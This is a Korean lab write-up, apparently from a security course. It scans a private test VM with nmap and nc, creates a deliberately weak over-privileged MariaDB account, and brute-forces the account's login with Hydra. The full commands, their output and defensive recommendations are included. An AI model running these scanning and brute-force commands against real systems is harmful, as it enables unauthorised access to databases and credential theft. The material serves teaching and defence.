
## 1. 포트 스캔 (nmap)

```bash
nmap -p 1433,3306,1521 -sV 192.168.63.128
```

### 실행 결과

```
Starting Nmap 7.94 ( https://nmap.org ) at 2026-07-28 03:16 EDT
Nmap scan report for 192.168.63.128
Host is up (0.00065s latency).

PORT     STATE    SERVICE  VERSION
1433/tcp filtered ms-sql-s
1521/tcp filtered oracle
3306/tcp open     mysql    MySQL 5.5.5-10.5.29-MariaDB
MAC Address: 00:0C:29:38:A7:A0 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
```

**3306** 
- mysql port : tcp 3306 port open
- 1433/1521 : MS-SQL / ORACLE port close
- 이전 firewall--cmd -permanent -add-port=3306/tcp로 방화벽 해제 
### 결과 해석

|포트|서비스|상태|
|---|---|---|
|1433|MS-SQL|filtered (방화벽 등에 막혀 응답 없음)|
|1521|Oracle|filtered|
|3306|MySQL/MariaDB|**open** (10.5.29-MariaDB 버전 확인됨)|

- `-p`: 스캔할 포트 지정
- `-sV`: 서비스 버전 정보까지 확인
- 3306만 열려 있어 공격 대상이 MariaDB로 좁혀짐

### 열린 포트 배너 직접 확인 (nc)

```bash
nc -w 1 192.168.63.128 3306
```

```
Y
5.5.5-10.5.29-MariaDBNX^NMx6B'...mysql_native_password
```

- 포트에 직접 접속해서 **서버 배너(버전 정보 + 인증 플러그인 종류)**를 확인
- 여기서 `mysql_native_password` 플러그인 사용 중임을 확인 가능
	- 대신 지금 사용하고 있는 mysql_native plugin은 상대적으로 암호화에 취약하여 sha_255 버전으로 업그레이드 필요

---

## 2. 테스트용 계정 준비 (공격 대상 ROCKY 서버 사전 세팅)

```sql
CREATE USER 'test'@'192.168.%.%' IDENTIFIED BY 'P@SSW0RD';
GRANT ALL PRIVILEGES ON *.* TO 'test'@'192.168.%.%' WITH GRANT OPTION;
```

- 브루트포스 실습을 위해 의도적으로 취약한 계정(`test` / `P@SSW0RD`)을 생성
- 모든 DB에 대한 전체 권한 + GRANT OPTION까지 부여 → 뚫리면 피해가 매우 큰 상태를 재현

---

## 3. Hydra를 이용한 무차별 대입 공격 (Brute Force)

### Hydra란?

**온라인 로그인 브루트포스 도구**, 계정/비밀번호 후보 목록을 자동으로 대입하여 로그인 성공 여부를 판별하는 툴이다. SSH, FTP, MySQL, RDP, HTTP 로그인 폼 등 다양한 프로토콜을 지원한다.

### 기본 문법

```bash
hydra [계정 옵션] [비밀번호 옵션] [대상 IP] [서비스명]
```

|옵션|의미|입력값 형태|
|---|---|---|
|`-l` (소문자)|단일 계정명 지정|문자열 (예: `test`)|
|`-L` (대문자)|계정 목록 파일 지정|파일 경로 (예: `user.txt`)|
|`-p` (소문자)|단일 비밀번호 지정|문자열 (예: `'P@SSW0RD'`)|
|`-P` (대문자)|비밀번호 목록 파일 지정|파일 경로 (예: `pass.txt`)|

### 실습 1: 단일 계정/비밀번호 직접 지정

```bash
hydra -l test -p 'P@SSW0RD' 192.168.63.128 mysql
```

**결과:**

```
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking mysql://192.168.63.128:3306/
[3306][mysql] host: 192.168.63.128   login: test   password: P@SSW0RD
1 of 1 target successfully completed, 1 valid password found
```

- 계정 1개 × 비밀번호 1개 → 총 1회 시도
- 정확한 조합으로 로그인 성공 확인

### 실습 2: 워드리스트(파일) 기반 대입

사전 준비: `/root/Desktop/user.txt`, `/root/Desktop/pass.txt`에 후보 계정/비밀번호를 한 줄씩 입력

```bash
hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.63.128 mysql
```

**결과:**

```
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 16 login tries (l:4/p:4), ~4 tries per task
[DATA] attacking mysql://192.168.63.128:3306/
[3306][mysql] host: 192.168.63.128   login: test   password: P@SSW0RD
1 of 1 target successfully completed, 1 valid password found
```

- `l:4/p:4` → 파일에 계정 4개, 비밀번호 4개가 있었다는 의미 (4×4 = 16가지 조합 가능)
- 여러 후보 중에서도 `test / P@SSW0RD` 조합을 정확히 찾아내어 로그인 성공

### 두 실습이 보여주는 것

1. **단일 값 테스트**로 특정 조합이 유효한지 빠르게 검증 가능
2. **파일 기반 대입**으로는 다수의 후보 중에서도 유효한 조합을 자동으로 찾아낼 수 있음
3. 결국 **약한/예측 가능한 비밀번호는 자동화 도구만으로도 짧은 시간 내 탈취 가능**하다는 것을 실증

---

## 4. 실습이 시사하는 방어 포인트

- **강력한 비밀번호 정책** (`validate_password`/`simple_password_check` 플러그인 등으로 강제)
- **호스트 제한**: 계정 생성 시 `LIKE`, `%` , `_` 와일드카드 남발 자제, 필요한 IP/대역만 허용
- **최소 권한 원칙**: `WITH GRANT OPTION` 및 전체 권한(`*.*`) 부여 지양
- **네트워크 노출 최소화**: 3306 포트를 외부에 불필요하게 열어두지 않기 (방화벽, 화이트리스트)
- **로그인 실패 대응**: 계정 잠금 정책, fail2ban 등으로 반복 시도 차단